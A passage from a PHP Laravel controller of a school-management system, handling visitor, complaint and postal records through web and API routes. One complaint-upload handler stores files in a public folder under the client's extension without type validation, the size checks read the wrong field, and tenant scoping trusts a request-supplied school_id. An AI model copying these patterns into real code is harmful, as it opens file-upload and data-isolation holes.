                $path = url('/') . '/public/uploads/visitor/' . $visitor->file;
                if (file_exists($path)) {
                    unlink($path);
                }
            }
            $result = $visitor->delete();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Visitor has been deleted successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('visitor');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }

    public function complaint()
    {
        $complaints = AramiscComplaint::all();
        return $this->sendResponse($complaints->toArray(), 'Complaint retrieved successfully.');
    }
    public function complaintStore(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'complaint_by' => "required",
            'complaint_type' => "required",
            'phone' => "required",
        ]);

        if ($validator->fails()) {
            return $this->sendError('Validation Error.', $validator->errors());
        }

        $maxFileSize = AramiscGeneralSettings::first('file_size')->file_size;
        $file = $request->file('content_file');
        $fileSize =  filesize($file);
        $fileSizeKb = ($fileSize / 1000000);
        if($fileSizeKb >= $maxFileSize){
            Toastr::error( 'Max upload file size '. $maxFileSize .' Mb is set in system', 'Failed');
            return redirect()->back();
        }

        $fileName = "";
        if ($request->file('file') != "") {
            $file = $request->file('file');
            $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
            $file->move('public/uploads/complaint/', $fileName);
            $fileName =  'public/uploads/complaint/' . $fileName;
        }


        $complaint = new AramiscComplaint();
        $complaint->complaint_by = $request->complaint_by;
        $complaint->complaint_type = $request->complaint_type;
        $complaint->complaint_source = $request->complaint_source;
        $complaint->phone = $request->phone;
        $complaint->date = date('Y-m-d', strtotime($request->date));
        $complaint->description = $request->description;
        $complaint->action_taken = $request->action_taken;
        $complaint->assigned = $request->assigned;
        $complaint->file = $fileName;
        $result = $complaint->save();

        if ($result) {
            return $this->sendResponse(null, 'Complaint has been created successfully.');
        } else {
            return $this->sendError('Something went wrong, please try again.');
        }
    }
    public function complaint_index(Request $request)
    {


        try {
            $complaints = AramiscComplaint::where('active_status', 1)->get();
            $complaint_types = AramiscSetupAdmin::where('type', 2)->get();
            $complaint_sources = AramiscSetupAdmin::where('type', 3)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['complaints'] = $complaints->toArray();
                $data['complaint_types'] = $complaint_types->toArray();
                $data['complaint_sources'] = $complaint_sources->toArray();
                return ApiBaseMethod::sendResponse($data, 'Complaints retrieved successfully.');
            }
            return view('backEnd.admin.complaint', compact('complaints', 'complaint_types', 'complaint_sources'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_complaint_index(Request $request,$id)
    {
        try {
            $complaints = AramiscComplaint::where('active_status', 1)->where('school_id',$id)->get();
            $complaint_types = AramiscSetupAdmin::where('type', 2)->where('school_id',$id)->get();
            $complaint_sources = AramiscSetupAdmin::where('type', 3)->where('school_id',$id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['complaints'] = $complaints->toArray();
                $data['complaint_types'] = $complaint_types->toArray();
                $data['complaint_sources'] = $complaint_sources->toArray();
                return ApiBaseMethod::sendResponse($data, 'Complaints retrieved successfully.');
            }
            return view('backEnd.admin.complaint', compact('complaints', 'complaint_types', 'complaint_sources'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function complaint_store(Request $request)
    {

        $input = $request->all();
        $validator = Validator::make($input, [
            'complaint_by' => "required|max:250",
            'complaint_type' => "required",
            'complaint_source' => "required",
            'phone' => "required|max:30",
            'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
        ]);


        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $maxFileSize = AramiscGeneralSettings::first('file_size')->file_size;
            $file = $request->file('content_file');
            $fileSize =  filesize($file);
            $fileSizeKb = ($fileSize / 1000000);
            if($fileSizeKb >= $maxFileSize){
                Toastr::error( 'Max upload file size '. $maxFileSize .' Mb is set in system', 'Failed');
                return redirect()->back();
            }
            $fileName = "";
            if ($request->file('file') != "") {
                $file = $request->file('file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/complaint/', $fileName);
                $fileName =  'public/uploads/complaint/' . $fileName;
            }

            $complaint = new AramiscComplaint();
            $complaint->complaint_by = $request->complaint_by;
            $complaint->complaint_type = $request->complaint_type;
            $complaint->complaint_source = $request->complaint_source;
            $complaint->phone = $request->phone;
            $complaint->date = date('Y-m-d', strtotime($request->date));
            $complaint->description = $request->description;
            $complaint->action_taken = $request->action_taken;
            $complaint->assigned = $request->assigned;
            $complaint->file = $fileName;
            $result = $complaint->save();


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Complaint has been created successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('complaint');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_complaint_store(Request $request)
    {

        $input = $request->all();
        $validator = Validator::make($input, [
            'complaint_by' => "required|max:250",
            'complaint_type' => "required",
            'complaint_source' => "required",
            'phone' => "required|max:30",
            'school_id' => "required",
            'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
        ]);


        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $maxFileSize = AramiscGeneralSettings::first('file_size')->file_size;
            $file = $request->file('content_file');
            $fileSize =  filesize($file);
            $fileSizeKb = ($fileSize / 1000000);
            if($fileSizeKb >= $maxFileSize){
                Toastr::error( 'Max upload file size '. $maxFileSize .' Mb is set in system', 'Failed');
                return redirect()->back();
            }
            $fileName = "";
            if ($request->file('file') != "") {
                $file = $request->file('file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/complaint/', $fileName);
                $fileName =  'public/uploads/complaint/' . $fileName;
            }

            $complaint = new AramiscComplaint();
            $complaint->complaint_by = $request->complaint_by;
            $complaint->complaint_type = $request->complaint_type;
            $complaint->complaint_source = $request->complaint_source;
            $complaint->phone = $request->phone;
            $complaint->date = date('Y-m-d', strtotime($request->date));
            $complaint->description = $request->description;
            $complaint->action_taken = $request->action_taken;
            $complaint->assigned = $request->assigned;
            $complaint->file = $fileName;
            $complaint->school_id = $request->school_id;
            $result = $complaint->save();


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Complaint has been created successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('complaint');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function complaint_edit(Request $request, $id)
    {
        try {
            $complaints = AramiscComplaint::where('active_status', 1)->get();
            $complaint = AramiscComplaint::find($id);

            $complaint_types = AramiscSetupAdmin::where('type', 2)->get();
            $complaint_sources = AramiscSetupAdmin::where('type', 3)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['complaints'] = $complaints->toArray();
                $data['complaint'] = $complaint->toArray();
                $data['complaint_types'] = $complaint_types->toArray();
                $data['complaint_sources'] = $complaint_sources->toArray();

                return ApiBaseMethod::sendResponse($data, 'complaint retrieved successfully.');
            }

            return view('backEnd.admin.complaint', compact('complaint', 'complaints', 'complaint_types', 'complaint_sources'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_complaint_edit(Request $request,$school_id, $id)
    {
        try {
            $complaints = AramiscComplaint::where('active_status', 1)->where('school_id', $school_id)->get();
            $complaint = AramiscComplaint::where('school_id', $school_id)->find($id);

            $complaint_types = AramiscSetupAdmin::where('type', 2)->where('school_id', $school_id)->get();
            $complaint_sources = AramiscSetupAdmin::where('type', 3)->where('school_id', $school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['complaints'] = $complaints->toArray();
                $data['complaint'] = $complaint->toArray();
                $data['complaint_types'] = $complaint_types->toArray();
                $data['complaint_sources'] = $complaint_sources->toArray();

                return ApiBaseMethod::sendResponse($data, 'complaint retrieved successfully.');
            }

            return view('backEnd.admin.complaint', compact('complaint', 'complaints', 'complaint_types', 'complaint_sources'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function complaint_update(Request $request)
    {
        $input = $request->all();

        $validator = Validator::make($input, [
            'complaint_by' => "required|max:250",
            'complaint_type' => "required",
            'complaint_source' => "required",
            'phone' => "required|max:30",
            'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $maxFileSize = AramiscGeneralSettings::first('file_size')->file_size;
            $file = $request->file('content_file');
            $fileSize =  filesize($file);
            $fileSizeKb = ($fileSize / 1000000);
            if($fileSizeKb >= $maxFileSize){
                Toastr::error( 'Max upload file size '. $maxFileSize .' Mb is set in system', 'Failed');
                return redirect()->back();
            }
            $fileName = "";
            if ($request->file('file') != "") {
                $complaint = AramiscComplaint::find($request->id);
                if ($complaint->file != "") {
                    if (file_exists($complaint->file)) {
                        unlink($complaint->file);
                    }
                }
                $file = $request->file('file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/complaint/', $fileName);
                $fileName =  'public/uploads/complaint/' . $fileName;
            }


            $complaint = AramiscComplaint::find($request->id);
            $complaint->complaint_by = $request->complaint_by;
            $complaint->complaint_type = $request->complaint_type;
            $complaint->complaint_source = $request->complaint_source;
            $complaint->phone = $request->phone;
            $complaint->date = date('Y-m-d', strtotime($request->date));
            $complaint->description = $request->description;
            $complaint->action_taken = $request->action_taken;
            $complaint->assigned = $request->assigned;
            if ($fileName != "") {
                $complaint->file = $fileName;
            }
            $result = $complaint->save();


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Complaint has been updated successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');

                    return redirect('complaint');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_complaint_update(Request $request)
    {
        $input = $request->all();

        $validator = Validator::make($input, [
            'complaint_by' => "required|max:250",
            'complaint_type' => "required",
            'complaint_source' => "required",
            'phone' => "required|max:30",
            'school_id' => "required",
            'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $maxFileSize = AramiscGeneralSettings::first('file_size')->file_size;
            $file = $request->file('content_file');
            $fileSize =  filesize($file);
            $fileSizeKb = ($fileSize / 1000000);
            if($fileSizeKb >= $maxFileSize){
                Toastr::error( 'Max upload file size '. $maxFileSize .' Mb is set in system', 'Failed');
                return redirect()->back();
            }
            $fileName = "";
            if ($request->file('file') != "") {
                $complaint = AramiscComplaint::find($request->id);
                if ($complaint->file != "") {
                    if (file_exists($complaint->file)) {
                        unlink($complaint->file);
                    }
                }
                $file = $request->file('file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/complaint/', $fileName);
                $fileName =  'public/uploads/complaint/' . $fileName;
            }


            $complaint = AramiscComplaint::find($request->id);
            $complaint->complaint_by = $request->complaint_by;
            $complaint->complaint_type = $request->complaint_type;
            $complaint->complaint_source = $request->complaint_source;
            $complaint->phone = $request->phone;
            $complaint->date = date('Y-m-d', strtotime($request->date));
            $complaint->description = $request->description;
            $complaint->action_taken = $request->action_taken;
            $complaint->assigned = $request->assigned;
            $complaint->school_id = $request->school_id;
            if ($fileName != "") {
                $complaint->file = $fileName;
            }
            $result = $complaint->save();


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Complaint has been updated successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');

                    return redirect('complaint');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }

    public function postal_receive_index(Request $request)
    {

        try {
            $postal_receives = AramiscPostalReceive::get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($postal_receives->toArray(), 'Postal retrieved successfully.');
            }
            return view('backEnd.admin.postal_receive', compact('postal_receives'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }


    public function saas_postal_receive_index(Request $request, $school_id)
    {

        try {
            $postal_receives = AramiscPostalReceive::where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($postal_receives->toArray(), 'Postal retrieved successfully.');
            }
            return view('backEnd.admin.postal_receive', compact('postal_receives'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }


    public function postal_receive_store(Request $request)
    {
        $input = $request->all();

        $validator = Validator::make($input, [
            'from_title' => "required|max:250",
            'reference_no' => "required|max:150",
            'address' => "required|max:250",
            'to_title' => "required|max:250",
            'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $maxFileSize = AramiscGeneralSettings::first('file_size')->file_size;
            $file = $request->file('content_file');
            $fileSize =  filesize($file);
            $fileSizeKb = ($fileSize / 1000000);
            if($fileSizeKb >= $maxFileSize){
                Toastr::error( 'Max upload file size '. $maxFileSize .' Mb is set in system', 'Failed');
                return redirect()->back();
            }
            $fileName = "";
            if ($request->file('file') != "") {
                $file = $request->file('file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/postal/', $fileName);
                $fileName =  'public/uploads/postal/' . $fileName;
            }


            $postal_receive = new AramiscPostalReceive();
            $postal_receive->from_title = $request->from_title;
            $postal_receive->reference_no = $request->reference_no;
            $postal_receive->address = $request->address;
            $postal_receive->date = date('Y-m-d', strtotime($request->date));
            $postal_receive->note = $request->note;
            $postal_receive->to_title = $request->to_title;
            $postal_receive->file = $fileName;
            $result = $postal_receive->save();


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Postal has been created successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_postal_receive_store(Request $request)
    {
        $input = $request->all();

        $validator = Validator::make($input, [
            'from_title' => "required|max:250",
            'reference_no' => "required|max:150",
            'address' => "required|max:250",
            'to_title' => "required|max:250",
            'school_id' => "required",
            'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $maxFileSize = AramiscGeneralSettings::first('file_size')->file_size;
            $file = $request->file('content_file');
            $fileSize =  filesize($file);
            $fileSizeKb = ($fileSize / 1000000);
            if($fileSizeKb >= $maxFileSize){
                Toastr::error( 'Max upload file size '. $maxFileSize .' Mb is set in system', 'Failed');
                return redirect()->back();
            }
            $fileName = "";
            if ($request->file('file') != "") {
                $file = $request->file('file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/postal/', $fileName);
                $fileName =  'public/uploads/postal/' . $fileName;
            }


            $postal_receive = new AramiscPostalReceive();
            $postal_receive->from_title = $request->from_title;
            $postal_receive->reference_no = $request->reference_no;
            $postal_receive->address = $request->address;
            $postal_receive->date = date('Y-m-d', strtotime($request->date));
            $postal_receive->note = $request->note;
            $postal_receive->to_title = $request->to_title;
            $postal_receive->file = $fileName;
            $postal_receive->school_id = $request->school_id;
            $result = $postal_receive->save();


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Postal has been created successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function postal_receive_show(Request $request, $id)
    {

        try {
            $postal_receives = AramiscPostalReceive::get();
            $postal_receive = AramiscPostalReceive::find($id);

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['postal_receives'] = $postal_receives->toArray();
                $data['postal_receive'] = $postal_receive->toArray();

                return ApiBaseMethod::sendResponse($data, 'Postal retrieved successfully.');
            }
            return view('backEnd.admin.postal_receive', compact('postal_receives', 'postal_receive'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_postal_receive_show(Request $request,$school_id, $id)
    {

        try {
            $postal_receives = AramiscPostalReceive::where('school_id',$school_id)->get();
            $postal_receive = AramiscPostalReceive::where('school_id',$school_id)->find($id);

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['postal_receives'] = $postal_receives->toArray();
                $data['postal_receive'] = $postal_receive->toArray();

                return ApiBaseMethod::sendResponse($data, 'Postal retrieved successfully.');
            }
            return view('backEnd.admin.postal_receive', compact('postal_receives', 'postal_receive'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function postal_receive_update(Request $request)
    {
        $input = $request->all();

        $validator = Validator::make($input, [
            'from_title' => "required|max:250",
            'reference_no' => "required|max:150",
            'address' => "required|max:250",
            'to_title' => "required|max:250",
            'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $maxFileSize = AramiscGeneralSettings::first('file_size')->file_size;
            $file = $request->file('content_file');
            $fileSize =  filesize($file);
            $fileSizeKb = ($fileSize / 1000000);
            if($fileSizeKb >= $maxFileSize){
                Toastr::error( 'Max upload file size '. $maxFileSize .' Mb is set in system', 'Failed');
                return redirect()->back();
            }
            $fileName = "";
            if ($request->file('file') != "") {
                $postal_receive = AramiscPostalReceive::find($request->id);
                if ($postal_receive->file != "") {
                    if (file_exists($postal_receive->file)) {
                        unlink($postal_receive->file);
                    }
                }
                $file = $request->file('file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/postal/', $fileName);
                $fileName =  'public/uploads/postal/' . $fileName;
            }

            $postal_receive = AramiscPostalReceive::find($request->id);
            $postal_receive->from_title = $request->from_title;
            $postal_receive->reference_no = $request->reference_no;
            $postal_receive->address = $request->address;
            $postal_receive->date = date('Y-m-d', strtotime($request->date));
            $postal_receive->note = $request->note;
            $postal_receive->to_title = $request->to_title;
            if ($fileName != "") {
                $postal_receive->file = $fileName;
            }
            $result = $postal_receive->save();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Postal has been updated successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');

                    return redirect('postal-receive');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_postal_receive_update(Request $request)
    {
        $input = $request->all();

        $validator = Validator::make($input, [
            'from_title' => "required|max:250",
            'reference_no' => "required|max:150",
            'address' => "required|max:250",
            'to_title' => "required|max:250",
            'school_id' => "required",
            'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $maxFileSize = AramiscGeneralSettings::first('file_size')->file_size;
            $file = $request->file('content_file');
            $fileSize =  filesize($file);
            $fileSizeKb = ($fileSize / 1000000);
            if($fileSizeKb >= $maxFileSize){
                Toastr::error( 'Max upload file size '. $maxFileSize .' Mb is set in system', 'Failed');
                return redirect()->back();
            }
            $fileName = "";
            if ($request->file('file') != "") {
                $postal_receive = AramiscPostalReceive::where('school_id',$request->school_id)->find($request->id);
                if ($postal_receive->file != "") {
                    if (file_exists($postal_receive->file)) {
                        unlink($postal_receive->file);
                    }
                }
                $file = $request->file('file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/postal/', $fileName);
                $fileName =  'public/uploads/postal/' . $fileName;
            }

            $postal_receive = AramiscPostalReceive::where('school_id',$request->school_id)->find($request->id);
            $postal_receive->from_title = $request->from_title;
            $postal_receive->reference_no = $request->reference_no;
            $postal_receive->address = $request->address;
            $postal_receive->date = date('Y-m-d', strtotime($request->date));
            $postal_receive->note = $request->note;
            $postal_receive->to_title = $request->to_title;
            $postal_receive->school_id = $request->school_id;
            if ($fileName != "") {
                $postal_receive->file = $fileName;
            }
            $result = $postal_receive->save();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Postal has been updated successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');

                    return redirect('postal-receive');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function postal_receive_destroy(Request $request, $id)
    {

        try {
            $postal_receive = AramiscPostalReceive::find($id);
            if ($postal_receive->file != "") {
                if (file_exists($postal_receive->file)) {
                    unlink($postal_receive->file);
                }
            }
            $result = $postal_receive->delete();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Postal has been deleted successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');

                    return redirect('postal-receive');
                } else {
                    Toastr::error('Operation Failed', 'Failed');

                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_postal_receive_destroy(Request $request,$school_id, $id)
    {

        try {
            $postal_receive = AramiscPostalReceive::where('school_id',$school_id)->find($id);
            if ($postal_receive->file != "") {
                if (file_exists($postal_receive->file)) {
                    unlink($postal_receive->file);
                }
            }
            $result = $postal_receive->delete();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Postal has been deleted successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');

                    return redirect('postal-receive');
                } else {
                    Toastr::error('Operation Failed', 'Failed');

                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }

    public function postal_dispatch_index(Request $request)
    {

        try {
            $postal_dispatchs = AramiscPostalDispatch::get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($postal_dispatchs->toArray(), 'Postal dispatchs retrieved successfully.');
            }
            return view('backEnd.admin.postal_dispatch', compact('postal_dispatchs'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_postal_dispatch_index(Request $request,$school_id)
    {

        try {
            $postal_dispatchs = AramiscPostalDispatch::where('school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($postal_dispatchs->toArray(), 'Postal dispatchs retrieved successfully.');
            }
            return view('backEnd.admin.postal_dispatch', compact('postal_dispatchs'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function postal_dispatch_store(Request $request)
    {
        $input = $request->all();

        $validator = Validator::make($input, [
            'from_title' => "required|max:250",
            'reference_no' => "required|max:150",
            'address' => "required|max:250",
            'to_title' => "required|max:250",
            'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
        ]);
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $maxFileSize = AramiscGeneralSettings::first('file_size')->file_size;
            $file = $request->file('content_file');
            $fileSize =  filesize($file);
            $fileSizeKb = ($fileSize / 1000000);
            if($fileSizeKb >= $maxFileSize){
                Toastr::error( 'Max upload file size '. $maxFileSize .' Mb is set in system', 'Failed');
                return redirect()->back();
            }
            $fileName = "";
            if ($request->file('file') != "") {
                $file = $request->file('file');
                $fileName = 'dis-' . md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/postal/', $fileName);
                $fileName =  'public/uploads/postal/' . $fileName;
            }


            $postal_dispatch = new AramiscPostalDispatch();
            $postal_dispatch->from_title = $request->from_title;
            $postal_dispatch->reference_no = $request->reference_no;
            $postal_dispatch->address = $request->address;
            $postal_dispatch->date = date('Y-m-d', strtotime($request->date));
            $postal_dispatch->note = $request->note;
            $postal_dispatch->to_title = $request->to_title;
            $postal_dispatch->file = $fileName;
            $result = $postal_dispatch->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Postal dispatch has been created successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');

                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_postal_dispatch_store(Request $request)
    {
        $input = $request->all();

        $validator = Validator::make($input, [
            'from_title' => "required|max:250",
            'reference_no' => "required|max:150",
            'address' => "required|max:250",
            'to_title' => "required|max:250",
            'school_id' => "required",
            'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
        ]);
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $maxFileSize = AramiscGeneralSettings::first('file_size')->file_size;
            $file = $request->file('content_file');
            $fileSize =  filesize($file);
            $fileSizeKb = ($fileSize / 1000000);
            if($fileSizeKb >= $maxFileSize){
                Toastr::error( 'Max upload file size '. $maxFileSize .' Mb is set in system', 'Failed');
                return redirect()->back();
            }
            $fileName = "";
            if ($request->file('file') != "") {
                $file = $request->file('file');
                $fileName = 'dis-' . md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/postal/', $fileName);
